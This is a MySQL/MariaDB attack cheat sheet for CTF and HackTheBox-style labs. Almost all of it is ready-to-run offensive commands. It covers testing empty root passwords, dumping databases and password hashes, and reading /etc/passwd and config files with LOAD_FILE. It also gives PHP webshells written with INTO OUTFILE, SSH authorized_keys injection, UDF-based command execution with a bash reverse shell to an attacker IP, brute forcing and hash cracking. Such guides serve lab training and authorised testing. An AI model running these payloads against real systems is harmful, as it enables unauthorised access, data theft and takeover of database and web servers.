> **MySQL / MariaDB** is a relational database that runs on **port 3306**. In CTFs, the most common misconfiguration is root access with no password — granting full database enumeration, file read/write, and potential RCE via UDF libraries.

---

## Quickstart — Unauthenticated Access

```bash
# Test if MySQL accepts root with no password
$ mysql -h 10.129.1.10 -u root

# With a password
$ mysql -h 10.129.1.10 -u root -p
$ mysql -h 10.129.1.10 -u root -proot
$ mysql -h 10.129.1.10 -u admin -padmin
```

**If `mysql` is not installed:**
```bash
sudo apt install mysql-client                    # Debian/Kali
sudo pacman -S mysql-clients                     # Arch
```

---

## Basic Enumeration

Once connected, these are the essential commands to map the database:

```sql
-- Server info
SHOW VARIABLES LIKE '%version%';
SELECT VERSION();
SELECT @@version;
SHOW VARIABLES LIKE 'datadir';
SHOW VARIABLES LIKE 'hostname';

-- List all databases
SHOW DATABASES;

-- Switch to a database
USE <database>;

-- List tables in current database
SHOW TABLES;

-- Show table structure
DESCRIBE <table>;
SHOW COLUMNS FROM <table>;

-- Dump entire table
SELECT * FROM <table>;

-- Count rows
SELECT COUNT(*) FROM <table>;

-- Current user & privileges
SELECT USER();
SELECT CURRENT_USER();
SHOW GRANTS;
```

---

## MySQL Commands Cheat Sheet

### Database Operations

| Command | What it does |
| :------ | :----------- |
| `SHOW DATABASES;` | List all databases |
| `USE <db>;` | Switch to a database |
| `SELECT DATABASE();` | Show current database |
| `CREATE DATABASE <name>;` | Create a new database |
| `DROP DATABASE <name>;` | Delete a database |
| `SHOW CREATE DATABASE <name>;` | Show database creation statement |

### Table Operations

| Command | What it does |
| :------ | :----------- |
| `SHOW TABLES;` | List tables in current DB |
| `DESCRIBE <table>;` | Show column names, types, keys |
| `SHOW COLUMNS FROM <table>;` | Same as DESCRIBE |
| `SHOW CREATE TABLE <table>;` | Show table creation statement |
| `SELECT * FROM <table>;` | Dump all rows |
| `SELECT column1,column2 FROM <table>;` | Dump specific columns |

### Filtering & Sorting

| Command | What it does |
| :------ | :----------- |
| `WHERE column='value'` | Filter by condition |
| `WHERE column LIKE '%pattern%'` | Pattern matching |
| `LIMIT <n>` | Return first N rows |
| `LIMIT <offset>,<n>` | Paginate results |
| `ORDER BY column ASC/DESC` | Sort results |
| `GROUP BY column` | Group rows |
| `SELECT DISTINCT column FROM <table>;` | Unique values |

### Information Schema (Database Metadata)

| Command | What it does |
| :------ | :----------- |
| `SELECT schema_name FROM information_schema.schemata;` | All databases |
| `SELECT table_name FROM information_schema.tables WHERE table_schema='db';` | Tables in a DB |
| `SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users';` | Columns in a table |
| `SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%pass%';` | Find columns by name |

---

## Data Exfiltration

### Dump a single table

```sql
SELECT * FROM <database>.<table>;
```

### Dump with concatenation (one-liner)

```sql
SELECT CONCAT(username,':',password) FROM users;
SELECT GROUP_CONCAT(username,':',password SEPARATOR '\n') FROM users;
```

### Non-interactive dump from bash

```bash
# Single query
mysql -h 10.129.1.10 -u root -e "SELECT * FROM htb.flag;"

# Batch — dump entire database schema + data
mysql -h 10.129.1.10 -u root -e "SHOW DATABASES;" | tail -n +2 | while read db; do
  echo "=== $db ==="
  mysql -h 10.129.1.10 -u root -e "SHOW TABLES FROM \`$db\`;" | tail -n +2 | while read table; do
    echo "  --- $table ---"
    mysql -h 10.129.1.10 -u root -e "SELECT * FROM \`$db\`.\`$table\`;"
  done
done
```

### mysqldump (if installed)

```bash
# Dump all databases
mysqldump -h 10.129.1.10 -u root --all-databases > full_dump.sql

# Dump a specific database
mysqldump -h 10.129.1.10 -u root htb > htb_dump.sql

# Dump a specific table
mysqldump -h 10.129.1.10 -u root htb users > users.sql
```

---

## Authentication & User Enumeration

### List all users and their password hashes

```sql
SELECT user,host,authentication_string,plugin FROM mysql.user;
SELECT user,host,password FROM mysql.user;  -- MySQL < 5.7
```

### Check current user privileges

```sql
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';
```

### Privilege indicators

```sql
-- FILE privilege → can read/write files
SELECT user,file_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(USER(),'@',1);

-- SUPER privilege → can enable features, read logs
SELECT user,super_priv FROM mysql.user;

-- Check secure_file_priv (limits LOAD_FILE / INTO OUTFILE paths)
SHOW VARIABLES LIKE 'secure_file_priv';
-- NULL → read/write anywhere
-- /var/lib/mysql-files/ → restricted to that directory
-- '' (empty) → disabled entirely (MySQL ≥ 5.7 default)
```

---

## Useful Nmap Scripts

```bash
# MySQL info + version detection
nmap -sV -p3306 --script mysql-info 10.129.1.10

# Check for empty root password
nmap -sV -p3306 --script mysql-empty-password 10.129.1.10

# Enumerate databases (requires credentials)
nmap -sV -p3306 --script mysql-databases --script-args mysqluser=root,mysqlpass="" 10.129.1.10

# Dump user hashes (requires credentials)
nmap -sV -p3306 --script mysql-dump-hashes --script-args username=root,password="" 10.129.1.10

# Enumerate all users
nmap -sV -p3306 --script mysql-users --script-args mysqluser=root,mysqlpass="" 10.129.1.10

# Brute force MySQL credentials
nmap -sV -p3306 --script mysql-brute 10.129.1.10

# Audit MySQL security configuration
nmap -sV -p3306 --script mysql-audit --script-args mysql-audit.username=root,mysql-audit.password="" 10.129.1.10
```

---

## File Read — LOAD_FILE

`LOAD_FILE()` reads files from the server's filesystem. Requires `FILE` privilege.

```sql
-- Check if you have FILE privilege
SELECT file_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(USER(),'@',1);

-- Read common files
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/hosts');
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('/proc/self/environ');

-- Non-readable results: try hex encoding the path
SELECT LOAD_FILE(0x2f6574632f706173737764);   -- /etc/passwd

-- Check secure_file_priv restriction
SHOW VARIABLES LIKE 'secure_file_priv';
-- If set, LOAD_FILE only reads from that directory
```

---

## File Write — INTO OUTFILE / DUMPFILE

Write query results to files — the classic MySQL webshell vector. Requires `FILE` privilege.

### Webshell via INTO OUTFILE

```sql
-- PHP webshell (one-liner)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- PHP webshell (full)
SELECT '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>".shell_exec($_REQUEST["cmd"])."</pre>"; } ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Avoid duplicate key / overwrite errors by using a temporary table
CREATE TABLE tmp (cmd TEXT);
INSERT INTO tmp VALUES ('<?php system($_GET["cmd"]); ?>');
SELECT * FROM tmp INTO OUTFILE '/var/www/html/shell.php';
DROP TABLE tmp;
```

### INTO DUMPFILE (binary-safe, single row)

```sql
-- Better for writing exact binary content (no newlines appended)
SELECT '<?php system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/shell.php';

-- Limit ensures single row
SELECT '<?php system($_GET["cmd"]); ?>' FROM dual LIMIT 1 INTO OUTFILE '/var/www/html/shell.php';
```

### SSH authorized_keys injection

```bash
# Generate keypair on attacker machine
ssh-keygen -t rsa -f mysql_key -N ''

# Inject the public key (replace newlines with \n)
# On the MySQL shell:
SELECT '\nssh-rsa AAAAB3NzaC1... user@kali\n' INTO OUTFILE '/root/.ssh/authorized_keys';
# or DUMPFILE for exact content without trailing newline
SELECT 'ssh-rsa AAAAB3NzaC1... user@kali\n' INTO DUMPFILE '/root/.ssh/authorized_keys';

# Connect
ssh -i mysql_key root@10.129.1.10
```

### Web Shell Path Cheat Sheet

| Platform | Default Web Roots |
| :------- | :---------------- |
| **Linux + Apache** | `/var/www/html/` |
| **Linux + Nginx** | `/usr/share/nginx/html/`, `/var/www/html/` |
| **Linux + XAMPP** | `/opt/lampp/htdocs/` |
| **Windows + IIS** | `C:\\inetpub\\wwwroot\\` |
| **Windows + XAMPP** | `C:\\xampp\\htdocs\\` |

> ⚠️ `secure_file_priv` must be empty or match your target directory. Check with `SHOW VARIABLES LIKE 'secure_file_priv';`.
> ⚠️ `INTO OUTFILE` appends a newline and escapes special chars. Use `INTO DUMPFILE` for binary-exact output.

---

## RCE via UDF (User-Defined Function)

When you have `FILE` privilege and can write to the MySQL plugin directory, you can load a malicious shared library for command execution.

### Step 1 — Find the plugin directory

```sql
SHOW VARIABLES LIKE 'plugin_dir';
-- Common paths:
--   /usr/lib/mysql/plugin/
--   /usr/lib/x86_64-linux-gnu/mariadb19/plugin/
--   /usr/lib64/mysql/plugin/
```

### Step 2 — Check architecture

```sql
SHOW VARIABLES LIKE '%version_compile%';
-- version_compile_machine: x86_64 or i686
-- version_compile_os: debian-linux-gnu, Linux, Win64
```

### Step 3 — Get the UDF library

```bash
# Option A — Use the pre-compiled raptor_udf2 from sqlmap
# Located at: /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so
# (adjust path for 32-bit / Windows)

# Option B — Use the popular lib_mysqludf_sys
git clone https://github.com/mysqludf/lib_mysqludf_sys
cd lib_mysqludf_sys && make

# On the attacker machine, convert the .so to hex
xxd -p lib_mysqludf_sys.so | tr -d '\n' > udf.hex
```

### Step 4 — Load the UDF into MySQL

```sql
-- Write the .so to the plugin directory via hex (split into chunks if needed)
SELECT 0x<HEX_CONTENT> INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- Create the function
CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';
CREATE FUNCTION sys_get RETURNS STRING SONAME 'udf.so';
CREATE FUNCTION sys_set RETURNS INT SONAME 'udf.so';
```

### Step 5 — Execute commands

```sql
-- Run a command (returns exit code: 0 = success)
SELECT sys_exec('id > /tmp/output.txt');

-- Read the output (if sys_eval is available)
SELECT sys_eval('id');
SELECT sys_eval('whoami');

-- Reverse shell
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"');

-- Clean up
DROP FUNCTION sys_exec;
```

### SQLMap UDF automation

```bash
# SQLMap can handle UDF loading automatically
sqlmap -u "http://target.htb/page.php?id=1" --os-shell --batch
```

---

## Cracking MySQL Password Hashes

### Identify the hash format

```sql
-- MySQL < 4.1: mysql.user.password is a 16-byte hash (OLD_PASSWORD)
-- MySQL 4.1 - 5.7: mysql.user.password is a 41-char hex string starting with *
-- MySQL ≥ 5.7 / MariaDB ≥ 10.2: mysql.user.authentication_string, plugin column matters

SELECT user,host,plugin,authentication_string FROM mysql.user;
-- plugin: mysql_native_password → SHA1 double hash (*...)
-- plugin: caching_sha2_password → SHA256 (MySQL 8.0+)
-- plugin: mysql_old_password → OLD_PASSWORD hash (16 bytes, no *)
```

### Hashcat modes

| Hash Type | Hashcat Mode | Example |
| :-------- | :----------: | :------ |
| MySQL 4.1+ (`*` prefix, 40 hex chars) | `300` | `*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19` |
| MySQL < 4.1 (OLD_PASSWORD, 16 bytes) | `300` | (same mode, different input format) |
| MySQL 8.0+ caching_sha2_password | `7400` | `$mysql$A$005*...` |
| MariaDB mysql_native_password | `300` | Same as MySQL 4.1+ |

### Crack it

```bash
# MySQL 4.1+ / MariaDB native password
hashcat -m 300 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# MySQL 8.0+ caching_sha2_password
hashcat -m 7400 -a 0 '$mysql$A$005*...' /usr/share/wordlists/rockyou.txt

# John the Ripper alternative
john --format=mysql-sha1 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Dump hashes non-interactively

```bash
# Using mysql client
mysql -h 10.129.1.10 -u root -e "SELECT user,authentication_string FROM mysql.user;"

# Using nmap
nmap -sV -p3306 --script mysql-dump-hashes --script-args username=root,password="" 10.129.1.10
```

---

## Useful Nmap Scripts Summary

```bash
# All-in-one MySQL reconnaissance
nmap -sV -p3306 --script "mysql-*" 10.129.1.10

# Key individual scripts:
nmap -sV -p3306 --script mysql-empty-password 10.129.1.10
nmap -sV -p3306 --script mysql-info 10.129.1.10
nmap -sV -p3306 --script mysql-databases --script-args mysqluser=root,mysqlpass="" 10.129.1.10
nmap -sV -p3306 --script mysql-dump-hashes --script-args username=root,password="" 10.129.1.10
nmap -sV -p3306 --script mysql-users --script-args mysqluser=root,mysqlpass="" 10.129.1.10
nmap -sV -p3306 --script mysql-variables --script-args mysqluser=root,mysqlpass="" 10.129.1.10
nmap -sV -p3306 --script mysql-brute 10.129.1.10
nmap -sV -p3306 --script mysql-audit --script-args mysql-audit.username=root,mysql-audit.password="" 10.129.1.10
```

---

## Brute Force

```bash
# Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.129.1.10
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt mysql://10.129.1.10

# Nmap
nmap -sV -p3306 --script mysql-brute 10.129.1.10

# Metasploit
auxiliary/scanner/mysql/mysql_login

# Medusa
medusa -h 10.129.1.10 -u root -P /usr/share/wordlists/rockyou.txt -M mysql
```

---

## MySQL Security Notes

- **Root with no password** is the #1 CTF misconfiguration — always try `mysql -h <IP> -u root` first
- **MariaDB on Debian** uses `unix_socket` auth for root locally — but if `bind-address = 0.0.0.0`, remote root may still be passwordless
- **`secure_file_priv`** limits `LOAD_FILE` and `INTO OUTFILE` — check it before attempting file ops
- **`FILE` privilege** is required for file read/write — check with `SELECT file_priv FROM mysql.user`
- **MySQL < 5.7** stores password hashes in `mysql.user.password` (visible to all users)
- **MySQL ≥ 5.7** stores hashes in `mysql.user.authentication_string`; `password` column is removed in 8.0
- **MySQL 8.0** uses `caching_sha2_password` instead of `mysql_native_password` — harder to crack offline
- **UDF requires** `FILE` privilege + write access to the plugin directory — check `@@plugin_dir`
- **Stacked queries** (`;`) are NOT supported by `mysql_query()` or `mysqli_query()` in PHP — need `mysqli_multi_query()` or PDO multi-statements

---

## Automation & One-liners

### Quick port check

```bash
nc -zv 10.129.1.10 3306
```

### Test empty root password

```bash
mysql -h 10.129.1.10 -u root -e "SELECT VERSION();" 2>/dev/null && echo "[+] No password!" || echo "[-] Auth required"
```

### Dump all non-system databases in one shot

```bash
mysql -h 10.129.1.10 -u root -N -e "SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('mysql','information_schema','performance_schema','sys');" | while read db; do
  echo "=== $db ==="
  mysql -h 10.129.1.10 -u root -e "SHOW TABLES FROM \`$db\`;" -N | while read table; do
    echo "  --- $table ---"
    mysql -h 10.129.1.10 -u root -e "SELECT * FROM \`$db\`.\`$table\`;"
  done
done
```

### Extract all column names containing 'pass' or 'flag'

```bash
mysql -h 10.129.1.10 -u root -N -e "
  SELECT CONCAT(table_schema,'.',table_name,'.',column_name)
  FROM information_schema.columns
  WHERE column_name LIKE '%pass%' OR column_name LIKE '%flag%' OR column_name LIKE '%secret%';
"
```

### Nmap quick enum

```bash
nmap -sV -p3306 --script mysql-empty-password,mysql-info,mysql-databases --script-args mysqluser=root,mysqlpass="" 10.129.1.10
```

---

## CTF / HTB Workflow Checklist

1. **Scan port** — `nmap -sV -p3306 10.129.1.10`
2. **Test empty root** — `mysql -h 10.129.1.10 -u root` → if you get a prompt, you're in
3. **Test common defaults** — `root:root`, `admin:admin`, `root:password`, `mysql:mysql`
4. **Enumerate DBs** — `SHOW DATABASES;`
5. **Switch to interesting DB** — `USE <non-system-db>;`
6. **List tables** — `SHOW TABLES;`
7. **Dump data** — `SELECT * FROM <table>;`
8. **Check privileges** — `SHOW GRANTS;` / `SELECT file_priv FROM mysql.user;`
9. **Check secure_file_priv** — `SHOW VARIABLES LIKE 'secure_file_priv';`
10. **Read files** — `SELECT LOAD_FILE('/etc/passwd');` (if FILE privilege)
11. **Write webshell** — `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';` (if FILE privilege + web dir writable)
12. **UDF RCE** — if FILE + plugin dir writable, load a shared library
13. **Dump hashes** — `SELECT user,authentication_string FROM mysql.user;` → crack with hashcat -m 300
14. **Brute force** — `hydra -l root -P rockyou.txt mysql://10.129.1.10`

---

## References

- [MySQL Official Documentation](https://dev.mysql.com/doc/refman/8.0/en/)
- [HackTricks — Pentesting MySQL (3306)](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql)
- [PayloadsAllTheThings — MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [Nmap NSE — mysql-* scripts](https://nmap.org/nsedoc/scripts/)
- [MySQL UDF Exploitation](https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf)
- [raptor_udf2 (sqlmap)](https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql)
